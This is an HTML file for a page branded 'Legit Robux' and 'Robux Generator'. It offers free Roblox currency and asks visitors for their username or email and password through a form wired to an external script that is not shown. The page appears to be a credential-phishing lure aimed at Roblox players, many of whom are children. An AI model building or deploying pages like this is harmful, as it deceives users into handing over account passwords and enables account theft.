<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Legit Robux</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="header">
        <h1>Robux Generator</h1> <!-- Başlık eklendi -->
    </div>

    <div class="login-container">

        <div class="h1"><h1>Legit Robux</h1></div>

        <form id="login-form">
            <div class="form-group">
                <label for="username">Enter Your Username/Email</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Enter Your Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group">
                <label for="robux-amount">Enter Robux Amount</label>
                <input type="text" id="robux-amount" name="robux-amount">
            </div>
            <button type="submit">Take Robux</button>
        </form>
        <div id="message"></div>
    </div>

    <div class="footer">

        <footer class="layout-footer" data-title="#footer">
                
        </footer>

    </div>

    <div class="header2">

        <h1>Legit Generator</h1>

    </div>


    <script src="script.js"></script>

</body>
</html>
